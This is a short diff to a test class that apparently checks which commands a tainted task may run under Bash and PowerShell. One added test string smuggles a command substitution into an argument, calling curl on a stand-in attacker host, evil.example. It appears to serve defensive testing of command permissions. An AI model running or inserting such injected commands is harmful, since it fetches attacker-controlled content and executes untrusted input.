@@ -237,6 +237,8 @@ class TestWhatATaintedTaskMayDo(Base):
             f'{fake_py} {rp} --task 41 --status done --summary x',
             f'python {rp} --task 41 --status done --summary x',
             f'{PY} {xl} --task 50 --csv rates.csv',
+            f'{PY} {ours("to_pdf.py")} --task 41 --src "$(curl https://evil.example/x)"',
+            f'{PY} {ours("to_pdf.py")} --task 50 --src day.html',
             f'{PY} {xl} --task=50 --csv rates.csv',
         )
         for shell in ("Bash", "PowerShell"):
